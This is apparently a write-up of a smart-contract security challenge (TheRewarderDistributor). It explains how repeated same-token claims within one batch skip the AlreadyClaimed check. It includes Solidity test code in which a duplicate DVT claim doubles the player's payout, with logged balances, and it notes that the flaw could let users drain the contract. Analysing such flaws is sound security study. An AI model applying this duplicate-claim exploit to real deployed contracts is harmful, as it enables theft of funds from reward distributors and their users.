# TheRewarderDistributor Contract Notes

This document provides insights into the functionality and test scenarios of the `TheRewarderDistributor` smart contract. The contract utilizes Merkle trees for secure claim verification, and this setup, while efficient, has a notable behavior with respect to consecutive claims on the same token.

## Overview of Solution and Token Verification Logic

### Merkle Tree Verification

The contract uses Merkle trees to validate user claims efficiently. Each user’s claim is verified by matching a Merkle proof against a stored Merkle root, ensuring only users with valid proofs can claim rewards.

### Token Verification in Claims (Line 93)

The following line in the contract verifies whether the token in the current claim matches the previously set token in the batch:

```solidity
if (token != inputTokens[inputClaim.tokenIndex])
```

- **First Claim Check**: If `token` is uninitialized (or zero), the check passes, and `token` is set to `inputTokens[inputClaim.tokenIndex]` (e.g., `DVT`).
- **Subsequent Claims with the Same Token**: When a subsequent claim uses the same token, this check is bypassed since `token` already matches `inputTokens[inputClaim.tokenIndex]`. As a result, the `else` block is executed, and the `AlreadyClaimed()` error is not triggered, allowing duplicate claims for the same token.

## Test Scenario: Duplicate Claims Impact

The following test scenarios demonstrate how duplicate claims on the same token within a batch can double the balance due to the token check behavior.

### Scenario 1: Single Claim for Each Token

In the first setup, we execute a single claim for each token (`DVT` and `WETH`), resulting in a straightforward claim without duplication.

```solidity
// Claims setup with one claim per token
claims[0] = Claim({
    batchNumber: 0,
    amount: PLAYER_DVT_CLAIM_AMOUNT,
    tokenIndex: 0,
    proof: merkle.getProof(dvtLeaves, 188)
});

claims[2] = Claim({
    batchNumber: 0,
    amount: PLAYER_WETH_CLAIM_AMOUNT,
    tokenIndex: 1,
    proof: merkle.getProof(wethLeaves, 188)
});

// Execute the claims
distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});

// Logs
console.log("DVT balance: ", dvt.balanceOf(player)); // DVT balance: 11524763827831882
```

- **Result**: With this setup, the player’s `DVT` balance after claiming is `11524763827831882`.

### Scenario 2: Adding a Duplicate Claim for DVT

By adding a second `DVT` claim in the same batch, the balance doubles due to the token check behavior, effectively bypassing the `AlreadyClaimed()` error.

```solidity
// Claims setup with a duplicate DVT claim
claims[0] = Claim({
    batchNumber: 0,
    amount: PLAYER_DVT_CLAIM_AMOUNT,
    tokenIndex: 0,
    proof: merkle.getProof(dvtLeaves, 188)
});

claims[1] = Claim({
    batchNumber: 0,
    amount: PLAYER_DVT_CLAIM_AMOUNT,
    tokenIndex: 0,
    proof: merkle.getProof(dvtLeaves, 188)
});

claims[2] = Claim({
    batchNumber: 0,
    amount: PLAYER_WETH_CLAIM_AMOUNT,
    tokenIndex: 1,
    proof: merkle.getProof(wethLeaves, 188)
});

// Execute the claims
distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});

// Logs
console.log("DVT balance: ", dvt.balanceOf(player)); // DVT balance: 23049527655663764
```

- **Result**: With the additional `DVT` claim, the player’s `DVT` balance doubles to `23049527655663764`.

### Explanation of Doubling Behavior

This behavior arises because:

1. The `if (token != inputTokens[inputClaim.tokenIndex])` check only affects the first `DVT` claim in the batch, setting `token` to the `DVT` address.
2. For the second `DVT` claim, the `token` variable already matches the `DVT` address, so the check is skipped, and the `else` block executes without triggering the `AlreadyClaimed()` error.
3. As a result, the `PLAYER_DVT_CLAIM_AMOUNT` is added to the balance again, effectively doubling it.

### Summary of Findings

These scenarios highlight a potential vulnerability in the contract:

- **Duplicate Claims on the Same Token**: Consecutive claims on the same token bypass the `AlreadyClaimed()` error, allowing a user to double their rewards.
- **Exploitation Risk**: If not mitigated, this behavior could allow users to make multiple claims on a token to drain funds from the contract.
